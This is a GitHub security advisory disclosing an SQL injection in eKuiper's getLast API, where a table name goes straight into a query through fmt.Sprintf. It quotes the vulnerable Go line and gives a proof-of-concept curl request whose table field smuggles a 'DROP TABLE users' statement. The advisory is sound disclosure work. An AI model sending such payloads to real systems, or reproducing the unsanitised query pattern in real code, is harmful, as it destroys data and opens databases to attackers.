# [H] eKuiper API endpoints handling SQL queries with user-controlled table names. 

## Summary
Severity: High
Advisory: GHSA-526j-mv3p-f4vv
CVE: CVE-2025-54379
CWE: CWE-89
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P (CVSS_V4)
Published: 2025-07-24
Source: https://github.com/advisories/GHSA-526j-mv3p-f4vv
Type: github-advisory

## Affected
- Go: `github.com/lf-edge/ekuiper/v2` — affected >=0 <2.2.1
- Go: `github.com/lf-edge/ekuiper` — affected >=0

## Details
### Summary
A critical SQL Injection vulnerability exists in the `getLast` API functionality of the eKuiper project. This flaw allows unauthenticated remote attackers to execute arbitrary SQL statements on the underlying SQLite database by manipulating the table name input in an API request. Exploitation can lead to data theft, corruption, or deletion, and full database compromise.


### Details
The root cause lies in the use of unsanitized user-controlled input when constructing SQL queries using `fmt.Sprintf`, without validating the `table` parameter. Specifically, in:

```go
query := fmt.Sprintf("SELECT * FROM %s ORDER BY rowid DESC LIMIT 1", table)
```
Any value passed as the `table` parameter is directly interpolated into the SQL string, enabling injection attacks. This is reachable via API interfaces that expose time-series queries.


### PoC
1. **Deploy eKuiper instance** (default config is sufficient).
2. **Send a crafted request to the SQL query endpoint**:
```bash
   curl -X POST http://localhost:9081/sql-query \
     -H "Content-Type: application/json" \
     -d '{
       "table": "sensors; DROP TABLE users; --",
       "operation": "getLast"
     }'
```
3. **Effect**: Executes two SQL queries — the first selects data, the second drops the `users` table.
4. **Verify Result**:
```bash
   sqlite3 etc/kuiper/data/kuiper.db ".tables"
```

### Impact
CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')


### Refferences
- https://github.com/lf-edge/ekuiper/commit/72c4918744934deebf04e324ae66933ec089ebd3

## References
- https://github.com/lf-edge/ekuiper/security/advisories/GHSA-526j-mv3p-f4vv
- https://nvd.nist.gov/vuln/detail/CVE-2025-54379
- https://github.com/lf-edge/ekuiper/commit/72c4918744934deebf04e324ae66933ec089ebd3
- https://github.com/lf-edge/ekuiper
